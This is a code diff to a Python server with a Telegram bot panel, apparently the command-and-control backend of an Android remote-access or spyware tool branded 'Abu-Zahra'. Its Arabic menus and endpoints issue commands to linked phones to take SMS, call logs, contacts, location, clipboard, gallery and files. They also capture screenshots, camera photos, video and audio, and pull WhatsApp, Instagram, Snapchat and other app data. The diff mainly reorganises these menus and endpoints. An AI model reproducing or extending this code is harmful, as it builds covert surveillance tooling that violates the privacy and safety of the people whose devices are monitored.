@@ -20,9 +20,6 @@ from pathlib import Path
 from urllib.parse import urlparse, parse_qs
 from collections import OrderedDict
 
-from streaming import StreamingManager, StreamType, StreamState
-from database import DatabaseManager
-
 import aiohttp
 from aiohttp import web
 
@@ -80,11 +77,6 @@ _data_body_dedup = {}  # dedup for /api/data body endpoint: device_id:command ->
 
 # Pending command parameters state: chat_id -> {"device_id": str, "command": str, "step": int, "params": dict, "msg_id": int}
 _pending_cmd_params = {}
-
-# Streaming and Database managers
-streaming_manager = StreamingManager()
-db = DatabaseManager()
-
 
 firebase_connected = False  # Tracks Firebase connectivity status
 
@@ -2025,19 +2017,6 @@ async def transition_command_state(cmd_id, new_status, **kwargs):
             # Broadcast via WebSocket
             await ws_broadcast_command_update(commands[i])
 
-            # === AUTO-DELETE: Remove command after completion ===
-            # Terminal states: success, failed, timeout, cancelled
-            if new_status in [CMD_STATE_SUCCESS, CMD_STATE_FAILED, CMD_STATE_TIMEOUT, CMD_STATE_CANCELLED]:
-                # Store command info for return
-                completed_cmd = commands[i].copy()
-                
-                # Remove command from list
-                commands = [c for c in commands if c.get("id") != cmd_id]
-                save_json(COMMANDS_FILE, commands)
-                log.info("Command %s AUTO-DELETED after terminal status: %s", cmd_id, new_status)
-                
-                return completed_cmd
-            
             return commands[i]
     
     return None
@@ -2181,8 +2160,7 @@ def get_device_command_queue(device_id):
     }
 
 def cleanup_expired_commands():
-    """Remove expired commands for offline devices.
-    NOTE: Completed commands are now AUTO-DELETED by transition_command_state()."""
+    """Remove expired commands for offline devices."""
     commands = load_json(COMMANDS_FILE, [])
     now = time.time()
     
@@ -2205,8 +2183,11 @@ def cleanup_expired_commands():
         if age < COMMAND_OFFLINE_EXPIRE:
             cleaned.append(cmd)
             continue
-        
-        # Completed commands are now auto-deleted, no need to keep them here
+            
+        # Keep if completed (for history)
+        if cmd.get("status") in [CMD_STATE_SUCCESS, CMD_STATE_FAILED, CMD_STATE_CANCELLED]:
+            cleaned.append(cmd)
+            continue
     
     if len(cleaned) != len(commands):
         save_json(COMMANDS_FILE, cleaned)
@@ -3072,16 +3053,19 @@ def ib(text, callback_data):
 
 
 def build_main_menu():
-    """Main Menu - Simple 3 buttons"""
-    devices = get_devices()
-    total_devices = len(devices)
-    online_devices = sum(1 for d in devices if d.get("active"))
-    
     return {
         "inline_keyboard": [
-            [ib("🔗 ربط جهاز جديد", "get_link_code")],
-            [ib("📱 أجهزتي المربوطة", "show_devices")],
-            [ib("❓ المساعدة", "show_help")],
+            [ib("📱 الأجهزة والربط", "menu_devices")],
+            [ib("📊 جمع البيانات", "menu_data")],
+            [ib("🌐 التواصل الاجتماعي", "menu_social")],
+            [ib("🎮 التحكم عن بعد", "menu_control")],
+            [ib("📦 إدارة التطبيقات", "menu_apps")],
+            [ib("📂 إدارة الملفات", "menu_files")],
+            [ib("🔒 الأمان والإدارة", "menu_security")],
+            [ib("🔍 المراقبة", "menu_monitor")],
+            [ib("⚙️ إعدادات النظام", "menu_syssettings")],
+            [ib("🖥️ إدارة السيرفر", "menu_server")],
+            [ib("⁉️ المساعدة", "menu_help")],
         ]
     }
 
@@ -3091,80 +3075,42 @@ def build_back_button(target="back_main"):
 
 
 def build_devices_menu():
-    """Connected Devices List - New Format"""
     devices = get_devices()
     rows = []
-    
+    for d in devices:
+        status = "🟢" if d.get("active") else "🔴"
+        name = d.get("name", d.get("id", "مجهول"))
+        rows.append([ib(f"{status} {name}", f"dev_{d['id']}")])
     if not devices:
         rows.append([ib("لا توجد أجهزة مربوطة", "no_action")])
-        rows.append([ib("🔗 ربط جهاز جديد", "get_link_code")])
-    else:
-        for d in devices:
-            name = d.get("name", d.get("id", "Unknown"))
-            battery = d.get("battery", "-")
-            active = d.get("active", False)
-            status_emoji = "🟢" if active else "🔴"
-            status_text = "Online" if active else "Offline"
-            
-            btn_text = f"{status_emoji} {name}"
-            rows.append([ib(btn_text, f"select_device_{d['id']}")])
-    
-    rows.append([ib("🔄 تحديث القائمة", "refresh_devices")])
+    rows.append([ib("🔗 ربط جهاز جديد", "do_link")])
     rows.append([ib("🔙 رجوع", "back_main")])
-    
     return {"inline_keyboard": rows}
 
 
 def build_device_menu(device_id):
-    """Full Device Control Panel - All commands organized by category"""
-    d = find_device(device_id)
-    if not d:
-        return build_back_button()
-
-    status = "🟢 متصل" if d.get("active") else "🔴 غير متصل"
-    battery = d.get("battery", "-")
-    name = d.get("name", device_id)
-
     return {
         "inline_keyboard": [
-            [ib(f"📱 {name}", "no_action")],
-            [ib(f"{status} | 🔋 {battery}%", "no_action")],
-            
-            [ib("━━━ 📊 جمع البيانات ━━━", "no_action")],
-            [ib("📨 الرسائل", f"cmd_sms_{device_id}"), ib("📞 المكالمات", f"cmd_calls_{device_id}")],
-            [ib("👤 جهات الاتصال", f"cmd_contacts_{device_id}"), ib("📍 الموقع", f"cmd_location_{device_id}")],
-            [ib("🔔 الإشعارات", f"cmd_notifications_{device_id}"), ib("📱 التطبيقات", f"cmd_apps_{device_id}")],
-            [ib("🔋 البطارية", f"cmd_battery_{device_id}"), ib("🖼️ المعرض", f"cmd_gallery_{device_id}")],
-            [ib("📋 الحافظة", f"cmd_clipboard_{device_id}"), ib("📶 الشبكة", f"cmd_network_info_{device_id}")],
-            [ib("💾 التخزين", f"cmd_storage_info_{device_id}"), ib("ℹ️ معلومات", f"cmd_info_{device_id}")],
-            
-            [ib("━━━ 🎮 التحكم عن بعد ━━━", "no_action")],
-            [ib("📸 لقطة شاشة", f"cmd_screenshot_{device_id}"), ib("🎥 بث الشاشة", f"cmd_record_video_{device_id}")],
-            [ib("📷 كاميرا أمامية", f"cmd_front_camera_{device_id}"), ib("📹 كاميرا خلفية", f"cmd_back_camera_{device_id}")],
-            [ib("🎤 تسجيل صوت", f"cmd_record_audio_{device_id}"), ib("🔊 صوت الجهاز", f"cmd_set_volume_{device_id}")],
-            [ib("🔔 رنين", f"cmd_ring_{device_id}"), ib("📳 اهتزاز", f"cmd_vibrate_{device_id}")],
-            [ib("🔦 الفلاش", f"cmd_torch_on_{device_id}"), ib("🔒 قفل", f"cmd_lock_phone_{device_id}")],
-            
-            [ib("━━━ 📂 إدارة الملفات ━━━", "no_action")],
-            [ib("📂 تصفح الملفات", f"cmd_list_files_{device_id}")],
-            [ib("📥 التحميلات", f"cmd_list_downloads_{device_id}"), ib("📸 الصور", f"cmd_list_dcim_{device_id}")],
-            [ib("🎵 الموسيقى", f"cmd_list_music_{device_id}"), ib("🎬 الفيديو", f"cmd_list_movies_{device_id}")],
-            
-            [ib("━━━ 🌐 التواصل الاجتماعي ━━━", "no_action")],
-            [ib("💬 واتساب", f"cmd_whatsapp_{device_id}"), ib("✈️ تيلجرام", f"cmd_telegram_app_{device_id}")],
-            [ib("📷 انستقرام", f"cmd_instagram_{device_id}"), ib("📘 ماسنجر", f"cmd_messenger_{device_id}")],
-            [ib("👻 سناب شات", f"cmd_snapchat_{device_id}"), ib("🎵 تيك توك", f"cmd_tiktok_{device_id}")],
-            
-            [ib("━━━ ⚙️ إعدادات ━━━", "no_action")],
-            [ib("⚙️ إعدادات الجهاز", f"submenu_syssettings_{device_id}")],
-            [ib("🔄 تحديث الحالة", f"refresh_device_{device_id}")],
-            [ib("🗑️ إلغاء الربط", f"unlink_device_{device_id}")],
-            [ib("🔙 رجوع", "show_devices")],
+            [ib("ℹ️ معلومات الجهاز", f"cmd_info_{device_id}")],
+            [ib("🔋 البطارية", f"cmd_battery_{device_id}"), ib("📍 الموقع", f"cmd_location_{device_id}")],
+            [ib("📲 الرسائل", f"cmd_sms_{device_id}"), ib("📞 المكالمات", f"cmd_calls_{device_id}")],
+            [ib("📇 جهات الاتصال", f"cmd_contacts_{device_id}"), ib("🔔 الإشعارات", f"cmd_notifications_{device_id}")],
+            [ib("📸 لقطة الشاشة", f"cmd_screenshot_{device_id}"), ib("📷 الكاميرا", f"submenu_camera_{device_id}")],
+            [ib("📋 الحافظة", f"cmd_clipboard_{device_id}"), ib("📱 التطبيقات", f"cmd_apps_{device_id}")],
+            [ib("🌐 التواصل", f"submenu_social_{device_id}")],
+            [ib("🎮 التحكم", f"submenu_control_{device_id}")],
+            [ib("📂 الملفات", f"submenu_files_{device_id}")],
+            [ib("🔒 الأمان", f"submenu_security_{device_id}")],
+            [ib("🔍 المراقبة", f"submenu_monitor_{device_id}")],
+            [ib("⚙️ الإعدادات", f"submenu_syssettings_{device_id}")],
+            [ib("🗑️ إلغاء الربط", f"do_unlink_{device_id}")],
+            [ib("🔙 رجوع", "menu_devices")],
         ]
     }
 
+
 def build_category_submenu(device_id, category):
-    """بناء قائمة فرعية للفئة - Build submenu for a command category with Arabic labels"""
+    """Build submenu for a command category with 2-column grid."""
     items = []
     for name, info in COMMAND_REGISTRY.items():
         if info["cat"] == category:
@@ -3218,22 +3164,27 @@ def build_syssettings_submenu(device_id):
 
 
 def build_server_menu():
-    """🖥️ قائمة إدارة السيرفر - Server Management Menu"""
     return {
         "inline_keyboard": [
             [ib("📊 حالة السيرفر", "srv_status")],
             [ib("📈 الإحصائيات", "srv_stats")],
             [ib("📝 سجل الأحداث", "srv_logs")],
             [ib("⚙️ الإعدادات", "srv_settings")],
+            [ib("🔑 تغيير كلمة المرور", "srv_setpass")],
+            [ib("➕ إضافة أدمن", "srv_addadmin")],
+            [ib("📢 إرسال عام", "srv_broadcast")],
             [ib("💾 نسخ احتياطي", "srv_backup")],
+            [ib("📤 تصدير", "srv_export")],
+            [ib("📥 استيراد", "srv_import")],
+            [ib("🗑️ مسح البيانات", "srv_cleardata")],
             [ib("🔄 إعادة تشغيل", "srv_restart")],
+            [ib("🔧 الصيانة", "srv_maintenance")],
             [ib("🔙 رجوع", "back_main")],
         ]
     }
 
 
 def build_help_menu():
-    """📖 دليل المساعدة - Help Guide with Arabic"""
     total = len(COMMAND_REGISTRY)
     cats = OrderedDict()
     for name, info in COMMAND_REGISTRY.items():
@@ -3242,27 +3193,23 @@ def build_help_menu():
             cats[cat] = []
         cats[cat].append(info)
     
-    text = f"📖 <b>دليل الأوامر</b>\n\n📊 الإجمالي: <b>{total}</b> أمر\n\n"
+    text = f"📖 <b>دليل الأوامر - أبو الزهراء</b>\n\nالإجمالي: <b>{total}</b> أوامر\n\n"
     cat_names = {
         "data": "📊 جمع البيانات", "social": "🌐 التواصل الاجتماعي",
         "control": "🎮 التحكم عن بعد", "apps": "📦 إدارة التطبيقات",
-        "files": "📂 إدارة الملفات", "security": "🔒 الأمان والحماية",
+        "files": "📂 إدارة الملفات", "security": "🔒 الأمان",
         "monitor": "🔍 المراقبة", "syssettings": "⚙️ إعدادات النظام",
     }
     for cat, items in cats.items():
-        text += f"<b>{cat_names.get(cat, cat)}</b> ({len(items)} أمر):\n"
+        text += f"<b>{cat_names.get(cat, cat)}</b> ({len(items)}):\n"
         for item in items[:3]:
-            text += f"  • {item['desc']}\n"
+            text += f"  /{item['cmd'].replace('get_','').replace('cmd_','')}\n"
         if len(items) > 3:
-            text += f"  ... و {len(items)-3} أوامر أخرى\n"
+            text += f"  ...+{len(items)-3} more\n"
         text += "\n"
     
-    text += "━━━━━━━━━━━━━━━━━━━━━\n\n"
-    text += "📱 /devices - قائمة الأجهزة\n"
-    text += "🔗 /link - ربط جهاز جديد\n"
-    text += "📋 /menu - القائمة الرئيسية\n"
-    text += "📊 /status - حالة السيرفر\n"
-    text += "❓ /help - المساعدة\n"
+    text += "📱 /devices - قائمة الأجهزة\n🔗 /link - ربط جهاز\n"
+    text += "📋 /menu - القائمة الرئيسية\n📊 /status - الحالة\n"
     return text
 
 # ============================================================================
@@ -3505,11 +3452,15 @@ async def handle_telegram_command(chat_id, text, message_id=None):
 
 
 async def handle_start(chat_id):
-    devices = get_devices()
-    online_devices = sum(1 for d in devices if d.get("active"))
-    total_devices = len(devices)
-    
-    text = "🎛️ <b>Abu-Zahra Admin</b>\n\n👋 مرحباً بك في نظام التحكم عن بعد\n\n━━━━━━━━━━━━━━━━\n📱 الأجهزة المربوطة: <code>" + str(total_devices) + "</code>\n🟢 متصل الآن: <code>" + str(online_devices) + "</code>\n━━━━━━━━━━━━━━━━\n"
+    text = (
+        "🟥 <b>سيرفر التحكم أبو الزهراء</b>\n\n"
+        "مرحباً بك في لوحة التحكم\n"
+        "تحكم بجميع الأجهزة المربوطة عن بعد\n\n"
+        f"🟢 وقت التشغيل: <code>{format_uptime(get_uptime())}</code>\n"
+        f"📱 الأجهزة: <code>{len(get_devices())}</code>\n"
+        f"📡 المنفذ: <code>{SERVER_PORT}</code>\n"
+        f"🌐 النطاق: <code>{SERVER_DOMAIN}</code>"
+    )
     await send_message(chat_id, text, reply_markup=build_main_menu())
 
 
@@ -3625,12 +3576,12 @@ async def handle_callback_query(callback):
 
         # ── Navigation ──
         if data == "back_main":
-            await edit_message_text(chat_id, message_id, "🎛️ <b>لوحة التحكم الرئيسية</b>\n\nاختر من القائمة أدناه:", reply_markup=build_main_menu())
+            await edit_message_text(chat_id, message_id, "📋 <b>القائمة الرئيسية</b>\nاختر:", reply_markup=build_main_menu())
             await answer_callback_query(cb_id)
             return
 
         if data == "menu_devices":
-            await edit_message_text(chat_id, message_id, "📱 <b>إدارة الأجهزة</b>\n\nاختر جهازاً للتحكم به:", reply_markup=build_devices_menu())
+            await edit_message_text(chat_id, message_id, "📱 <b>الأجهزة</b>", reply_markup=build_devices_menu())
             await answer_callback_query(cb_id)
             return
 
@@ -3641,7 +3592,7 @@ async def handle_callback_query(callback):
             return
 
         if data == "menu_server":
-            await edit_message_text(chat_id, message_id, "🖥️ <b>إدارة السيرفر</b>\n\nلوحة تحكم السيرفر:", reply_markup=build_server_menu())
+            await edit_message_text(chat_id, message_id, "🖥️ <b>إدارة السيرفر</b>", reply_markup=build_server_menu())
             await answer_callback_query(cb_id)
             return
 
@@ -3686,9 +3637,7 @@ async def handle_callback_query(callback):
             d = find_device(device_id)
             if d:
                 status = "🟢 متصل" if d.get("active") else "🔴 غير متصل"
-                model = d.get('model', '—')
-                battery = d.get('battery', '—')
-                text = f"📱 <b>{d.get('name', device_id)}</b>\n{status} | 📱 {model} | 🔋 {battery}\n\nاختر من لوحة التحكم:"
+                text = f"📱 <b>{d.get('name', device_id)}</b>\n{status} | {d.get('model','—')}\n\nاختر إجراء:"
                 await edit_message_text(chat_id, message_id, text, reply_markup=build_device_menu(device_id))
             else:
                 await answer_callback_query(cb_id, "الجهاز غير موجود", show_alert=True)
@@ -3726,19 +3675,8 @@ async def handle_callback_query(callback):
                     kb = build_syssettings_submenu(device_id)
                 else:
                     kb = build_back_button()
-                # Arabic category labels
-                cat_labels_ar = {
-                    "submenu_data": "📊 جمع البيانات",
-                    "submenu_social": "🌐 التواصل الاجتماعي",
-                    "submenu_control": "🎮 التحكم عن بعد",
-                    "submenu_apps": "📦 إدارة التطبيقات",
-                    "submenu_files": "📂 إدارة الملفات",
-                    "submenu_security": "🔒 الأمان والحماية",
-                    "submenu_monitor": "🔍 المراقبة",
-                    "submenu_syssettings": "⚙️ إعدادات النظام",
-                }
-                cat_label = cat_labels_ar.get(prefix, prefix.replace("submenu_", "").title())
-                await edit_message_text(chat_id, message_id, f"{cat_label}\n\nاختر أمراً:", reply_markup=kb)
+                cat_label = prefix.replace("submenu_", "").title()
+                await edit_message_text(chat_id, message_id, f"📂 <b>{cat_label} - الأوامر</b>\nاختر أمراً:", reply_markup=kb)
                 await answer_callback_query(cb_id)
                 return
 
@@ -3748,21 +3686,13 @@ async def handle_callback_query(callback):
             kb = {
                 "inline_keyboard": [
                     [ib("📷 كاميرا أمامية", f"exec_front_camera_{device_id}")],
-                    [ib("📹 كاميرا خلفية", f"exec_back_camera_{device_id}")],
+                    [ib("📷 كاميرا خلفية", f"exec_back_camera_{device_id}")],
                     [ib("🎬 تسجيل فيديو", f"exec_record_video_{device_id}")],
                     [ib("🔙 رجوع", f"dev_{device_id}")],
                 ]
             }
-            await edit_message_text(chat_id, message_id, "📷 <b>الكاميرا</b>\n\nاختر نوع الكاميرا:", reply_markup=kb)
+            await edit_message_text(chat_id, message_id, "📷 <b>الكاميرا</b>", reply_markup=kb)
             await answer_callback_query(cb_id)
-            return
-
-        # ── Refresh device menu ──
-        if data.startswith("refresh_dev_"):
-            device_id = data[len("refresh_dev_"):]
-            kb = build_device_menu(device_id)
-            await edit_message_text(chat_id, message_id, "📱 <b>لوحة تحكم الجهاز</b>", reply_markup=kb)
-            await answer_callback_query(cb_id, "🔄 تم التحديث!")
             return
 
         # ── Execute command from inline button ──
@@ -4296,8 +4226,6 @@ async def api_heartbeat(request):
     api_hits += 1
     try:
         body = await request.json()
-        if body is None:
-            return web.json_response({"ok": False, "error": "No data provided"}, status=400)
         device_id = body.get("device_id", "")
 
         if not device_id:
@@ -4341,48 +4269,6 @@ async def api_heartbeat(request):
         log.error("heartbeat error: %s", exc)
         return web.json_response({"ok": True, "success": True})  # لا نريد فشل الـ heartbeat
 
-
-
-
-async def api_event(request):
-    """POST /api/event - Handle events from Android client."""
-    global api_hits
-    api_hits += 1
-    try:
-        data = await request.json()
-        if not data:
-            return web.json_response({"ok": False, "error": "No data"}, status=400)
-        
-        device_id = data.get("device_id")
-        event_type = data.get("type")
-        event_data = data.get("data", {})
-        
-        # Store event
-        event = {
-            "id": str(uuid.uuid4()),
-            "device_id": device_id,
-            "type": event_type,
-            "data": event_data,
-            "timestamp": datetime.now().isoformat()
-        }
-        
-        # Save to events.json
-        events_file = DATA_DIR / "events.json"
-        events = []
-        if events_file.exists():
-            try:
-                events = json.loads(events_file.read_text())
-            except:
-                events = []
-        events.append(event)
-        events_file.write_text(json.dumps(events, indent=2))
-        
-        log.info("Event from %s: type=%s", device_id, event_type)
-        
-        return web.json_response({"ok": True, "event_id": event["id"]})
-    except Exception as exc:
-        log.error("event error: %s", exc)
-        return web.json_response({"ok": False, "error": str(exc)}, status=500)
 
 async def api_device_data(request):
     """POST /api/data/{device_id} - Receive data from device."""
@@ -5844,7 +5730,6 @@ def create_app():
     app.router.add_post("/api/data/{device_id}", api_device_data)
     app.router.add_post("/api/data", api_device_data_body)
     app.router.add_post("/api/heartbeat", api_heartbeat)
-    app.router.add_post("/api/event", api_event)
     app.router.add_get("/api/settings/{device_id}", api_device_settings)
 
     # New API endpoints for health and command management
